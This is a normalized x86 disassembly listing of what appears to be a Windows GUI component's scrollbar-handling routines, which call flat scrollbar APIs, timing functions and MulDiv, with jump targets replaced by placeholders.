mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_47078c
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_494b68
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_479ce0
push eax
call FlatSB_GetScrollInfo
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_494bc4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_494d9e ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_494ac0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_494ac0
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_494f3c
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov edi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
push ebp
call sub_494b68
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ebx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ebx
mov [ ebp - 0xc ] eax
mov edi ebx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
push ebp
call sub_494b68
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call GetTickCount
mov ebx eax
mov esi ebx
sub esi [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x20 ]
jae r-xdata
xor edi edi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
sub eax esi
push eax
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x9c ]
dec edi
test edi edi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_494f3c
jmp r-xdata
sub_494ec4
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_495690
test esi esi
jne r-xdata
movzx eax [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_494f3c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_479ce0
push eax
call FlatSB_GetScrollPos
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_479ce0
push eax
call FlatSB_SetScrollPos
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_479830
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_479830
jmp r-xdata
xor edx edx
call sub_4946a4
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x2bc ] 0x0
je r-xdata
mov eax [ eax + 0x2bc ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_494ff8
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_495690
test esi esi
jne r-xdata
movzx eax [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_4950b4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_479ce0
push eax
call FlatSB_SetScrollProp
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_479ce0
push eax
call FlatSB_SetScrollProp
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_479ce0
push eax
call FlatSB_SetScrollProp
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_44bb2c
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_479ce0
push eax
call FlatSB_SetScrollProp
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_479ce0
push eax
call FlatSB_SetScrollProp
sub_4951bc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
movzx ecx [ ebp - 0x6 ]
movzx edx [ ebp - 0x5 ]
mov eax [ esi ]
call sub_494ac0
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
movzx ecx [ ebp - 0x6 ]
movzx edx [ ebp - 0x5 ]
mov eax [ esi ]
call sub_494ac0
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
mov edx [ esi ]
xor eax eax
mov [ edx + 0x44 ] al
push ebp
call sub_4950b4
pop ecx
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_479ce0
push eax
call FlatSB_SetScrollInfo
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_494f3c
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_494ac0
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_4952d0
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_474178
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_494734
mov [ ebx + 0x278 ] eax
push 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_494734
mov [ ebx + 0x288 ] eax
mov [ ebx + 0x274 ] 0x0
mov eax [ ebx + 0xac ]
movzx edx [ r-xdata ]
mov [ eax + 0x10 ] dl
movzx edx [ r-xdata ]
mov [ eax + 0x11 ] dl
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_495374
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
lea eax [ esi + 0x278 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
lea eax [ esi + 0x288 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47434c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_4953d0
push ebx
mov ebx eax
mov eax ebx
call sub_475ab8
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_495690
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_417224
test al al
jne r-xdata
mov eax ebx
call sub_479ce0
push eax
call InitializeFlatSB
sub_495410
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_495610
mov ecx edi
mov edx esi
mov eax ebx
call sub_475104
pop edi
pop esi
pop ebx
retn
sub_495450
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_495558
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_47074c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x278 ]
mov eax ebx
call sub_4949d8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_475884
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_494f3c
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_475848
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_475848
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_4303e0
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_470438
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49555f
mov eax [ ebp - 0x10 ]
call sub_4055f0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_494818
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4305a0
xor ecx ecx
mov edx 0xb03e
call sub_472314
inc ebx
dec esi
jne r-xdata
sub_495568
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi ] 0x104
jne r-xdata
pop esi
pop ebx
retn
mov [ ecx ] 0x1
test [ esi + 0xc ] 0x1
je r-xdata
mov eax [ ebx + 0x278 ]
mov edx [ eax + 0xc ]
mov ecx [ esi + 0x4 ]
sub ecx [ ebx + 0x27c ]
sub edx ecx
call sub_494f3c
mov eax [ ebx + 0x288 ]
mov edx [ eax + 0xc ]
mov ecx [ esi + 0x8 ]
sub ecx [ ebx + 0x280 ]
sub edx ecx
call sub_494f3c
mov eax [ esi + 0x4 ]
mov [ ebx + 0x27c ] eax
mov eax [ esi + 0x8 ]
mov [ ebx + 0x280 ] eax
mov eax [ esi + 0x4 ]
mov [ ebx + 0x27c ] eax
mov eax [ esi + 0x8 ]
mov [ ebx + 0x280 ] eax
jmp r-xdata
sub_4955dc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4717e8
test [ ebx ] 0x2
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x274 ] 0x0
jne r-xdata
movzx eax [ r-xdata ]
not eax
and al [ ebx ]
mov [ ebx ] al
sub_495634
push ebx
mov ebx eax
cmp dl [ ebx + 0x274 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x274 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x278 ]
call sub_495084
xor edx edx
mov eax [ ebx + 0x288 ]
call sub_495084
mov eax ebx
call sub_495610
jmp r-xdata
sub_495690
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x284 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_47a060
test al al
je r-xdata
xor eax eax
push ebp
push sub_49577b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x284 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
call sub_494b50
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_494b50
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov cl 0x1
xor edx edx
call sub_4951bc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
xor ecx ecx
mov dl 0x1
call sub_4951bc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
xor ecx ecx
xor edx edx
call sub_4951bc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
xor ecx ecx
mov dl 0x1
call sub_4951bc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov cl 0x1
xor edx edx
call sub_4951bc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
xor ecx ecx
mov dl 0x1
call sub_4951bc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x284 ] 0x0
retn
sub_4957a8
cmp [ eax + 0x270 ] 0x0
jle r-xdata
retn
dec [ eax + 0x270 ]
cmp [ eax + 0x270 ] 0x0
jne r-xdata
mov edx [ eax + 0x278 ]
cmp [ edx + 0x1c ] 0x0
jne r-xdata
call sub_495610
mov edx [ eax + 0x288 ]
cmp [ edx + 0x1c ] 0x0
je r-xdata
sub_4957e0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_46ff08
sub bl 0x1
jb r-xdata
mov eax [ esi + 0xac ]
movzx edx [ r-xdata ]
cmp dl [ eax + 0x10 ]
setne al
pop esi
pop ebx
retn
je r-xdata
mov eax [ esi + 0xac ]
movzx edx [ r-xdata ]
cmp dl [ eax + 0x11 ]
setne al
jmp r-xdata
pop esi
pop ebx
retn
sub_49582c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebx + 0x278 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x288 ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_47085c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_470990
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_47085c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_470990
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_47074c
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x278 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_494f3c
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_47074c
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_47078c
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x288 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_494f3c
jmp r-xdata
mov esi [ ebx + 0x278 ]
mov eax ebx
call sub_47074c
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_494f3c
mov eax ebx
call sub_47074c
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_47078c
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x288 ]
mov eax ebx
call sub_47078c
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_494f3c
mov eax ebx
call sub_47078c
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_495980
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x278 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x288 ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x278 ]
call sub_494f3c
xor edx edx
mov eax [ ebx + 0x288 ]
call sub_494f3c
cmp [ ebx + 0x274 ] 0x0
jne r-xdata
mov eax [ ebx + 0x278 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x288 ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x278 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x288 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_495084
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_495084
sub_495a24
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_495980
mov ecx edi
mov edx esi
mov eax ebx
call sub_4796c8
pop edi
pop esi
pop ebx
retn
sub_495a4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x270 ]
xor edx edx
push ebp
push sub_495ab8
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_477e3c
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xf4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_495abf
mov eax [ ebp - 0x4 ]
dec [ eax + 0x270 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_495abf
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x284 ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x284 ] 0x1
xor eax eax
push ebp
push sub_495b07
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_495610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_495b0e
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x284 ] dl
retn
sub_495b0e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_495690
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_495b84
push ebx
push esi
push edi
add esp 0xffffffec
mov [ esp ] edx
mov ebx eax
mov eax ebx
call sub_47074c
mov edx [ ebx + 0x278 ]
mov edx [ edx + 0x10 ]
cmp eax edx
jge r-xdata
mov esi eax
mov esi edx
jmp r-xdata
mov edi edx
mov edi eax
jmp r-xdata
mov eax ebx
call sub_47078c
mov edx [ ebx + 0x288 ]
mov edx [ edx + 0x10 ]
cmp eax edx
jle r-xdata
push edi
lea eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x288 ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ ebx + 0x278 ]
mov eax [ eax + 0xc ]
neg eax
mov ecx esi
call sub_40ac8c
mov eax [ esp ]
lea esi [ esp + 0x4 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ esp ]
mov eax ebx
call sub_4745a8
add esp 0x14
pop edi
pop esi
pop ebx
retn
sub_495c04
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_495c65
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_40580c
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_478e14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_495c6c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_495c94
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_495e13
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4952d0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_495df1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
movzx eax [ eax + 0xd1 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x370 ] al
test al al
